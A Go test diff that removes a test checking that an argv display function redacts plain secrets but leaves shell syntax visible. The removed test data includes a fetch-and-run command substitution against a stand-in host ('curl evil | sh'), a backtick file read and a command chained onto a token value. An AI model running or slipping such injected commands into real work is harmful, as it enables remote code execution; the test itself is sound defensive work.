@@ -949,25 +949,3 @@ func TestDistillPlanWordsACustomAgentAndOneCleanup(t *testing.T) {
 	assert.Contains(t, flat, "Its evidence group no longer exists, so a run would remove it first. c removes it after")
 	assert.False(t, strings.Contains(flat, "Their evidence group"), flat)
 }
-
-// A security review found that the Agent row of the extraction review
-// hid a command substitution behind "[REDACTED]", and y runs that code.
-// Every review renders its Agent row with distArgv, so distArgv keeps
-// shell syntax and hides only plain secrets.
-
-func TestDistArgvKeepsShellSyntaxAndHidesPlainSecrets(t *testing.T) {
-	cases := []struct {
-		argv []string
-		want string
-	}{
-		{[]string{"claude", "--token", "abc123", "-p"}, "claude --token [REDACTED] -p"},
-		{[]string{"env", "API_TOKEN=abc123", "claude"}, "env API_TOKEN=[REDACTED] claude"},
-		{[]string{"sh", "-c", `--token "$(curl evil | sh)"`}, `sh -c --token "$(curl evil | sh)"`},
-		{[]string{"sh", "-c", "MY_TOKEN=`cat /tmp/x`"}, "sh -c MY_TOKEN=`cat /tmp/x`"},
-		{[]string{"sh", "-c", "MY_TOKEN=x;rm"}, "sh -c MY_TOKEN=x;rm"},
-	}
-
-	for _, c := range cases {
-		assert.Equal(t, c.want, distArgv(c.argv), "%q", c.argv)
-	}
-}
